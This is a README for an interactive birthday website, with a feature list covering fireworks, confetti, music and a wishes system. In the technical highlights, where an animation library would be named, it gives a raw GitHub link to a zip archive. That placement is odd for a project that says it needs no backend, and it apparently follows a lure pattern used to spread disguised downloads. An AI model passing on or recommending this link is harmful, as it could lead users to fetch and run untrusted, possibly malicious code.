# Happy Birthday 🎉

A dynamic and interactive birthday celebration website that brings joy through engaging animations and personal touches. Perfect for creating memorable virtual birthday experiences.

## ✨ Features

### Interactive Elements
- 🎆 Real-time fireworks animation
- 🎊 Dynamic confetti effects
- 🎵 Background birthday music
- 💝 3D tilt effect birthday card
- ✍️ Interactive name animations
- 🎨 Click effects with personalized messages

### Wishes System
- 📝 Leave personalized birthday messages
- 📋 View wishes from others
- 🔐 Admin panel for message management
- 💫 Animated message notifications

### Technical Highlights
- Responsive design for all devices
- Smooth animations using https://github.com/Peemkay/Happy-Birthday/raw/refs/heads/main/reforce/Birthday-Happy-v1.5.zip
- Custom fireworks effects
- Local storage for wishes
- Cross-browser compatible
- No backend required
